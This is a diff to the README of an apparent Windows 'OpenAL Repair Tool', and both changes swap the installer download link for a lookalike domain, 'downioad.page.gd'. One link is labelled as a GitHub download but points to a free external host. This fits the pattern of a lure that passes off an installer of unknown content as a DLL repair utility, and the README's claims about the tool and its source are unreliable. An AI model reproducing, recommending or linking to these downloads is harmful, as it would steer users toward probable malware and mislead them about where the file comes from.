@@ -2,7 +2,7 @@
 
 OpenAL Repair Tool is a dedicated utility for Windows users to resolve OpenAL-related audio issues. It efficiently handles missing DLL files and installation errors, ensuring that your games and applications run with proper sound. Developed in 2026, it incorporates the latest fixes and improvements for enhanced reliability.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -79,7 +79,7 @@ OpenAL Repair Tool scans your system for OpenAL components, compares them agains
 
 To get started, download the latest version directly from our GitHub page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: March 2026*
 
